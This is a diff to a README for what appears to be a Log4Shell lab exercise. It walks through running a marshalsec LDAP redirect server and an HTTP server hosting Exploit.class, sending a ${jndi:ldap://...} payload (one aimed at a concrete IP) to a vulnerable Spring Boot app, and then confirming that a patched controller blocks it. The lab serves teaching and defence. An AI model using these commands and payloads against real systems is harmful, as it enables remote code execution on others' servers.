@@ -18,11 +18,11 @@ Also, Ports 8000, 8080, 1389 and 389 are open in your EC2 Security Group (for th
 
 ## Part 1: Exploitation (MITRE ATT&CK)
 After launching the ldap app "python3 ldap_server.py"  i received this error: ldap3.core.exceptions.LDAPSocketOpenError: socket connection error while opening: [Errno 111] Connection refused; after researching this error, i came to the point of using marshalsec, which is a malicious LDAP redirect server, not a real LDAP directory; i cloned it (git clone https://github.com/mbechler/marshalsec.git) then built it. I then ran manually these commands 
-# HTTP server (for payload)
+### HTTP server (for payload)
 cd exploit/
 python3 -m http.server 8000
 
-# LDAP redirect server
+### LDAP redirect server
 java -cp marshalsec-*.jar marshalsec.jndi.LDAPRefServer http://<your-ip>:8000/#Exploit
 To exploit the Log4Shell vulnerability, a vulnerable Spring Boot app using Log4j was set up to log user input. A malicious LDAP server was launched using marshalsec to redirect requests to an HTTP server hosting a malicious Exploit.class. The exploit payload ${jndi:ldap://<attacker-ip>:1389/Exploit} was sent via a POST request to the app’s /log endpoint. When the app logged this input, it triggered the JNDI lookup, causing the app to connect to the LDAP server. This demonstrated remote code loading behavior, confirming the Log4Shell vulnerability's exploitation path from input to remote callback.
 
@@ -55,6 +55,11 @@ after: ![image](https://github.com/user-attachments/assets/cc7b0dfe-1943-4a31-a9
 
 That confirms the patch is working; the pdated application successfully blocked the Log4Shell exploit attempt.
 What Just Happened: we sent the malicious payload {"input": "${jndi:ldap://44.208.30.186:1389/Exploit}"} ; The updated LogController.java now includes input validation that detects and blocks JNDI injection attempts and the app returned: Blocked suspicious input!
+
+Testing with normal input returns Logged: Hello World!
+
+![image](https://github.com/user-attachments/assets/4204f54e-a58b-45e4-8ab9-7082524fbea8)
+
   
 
 
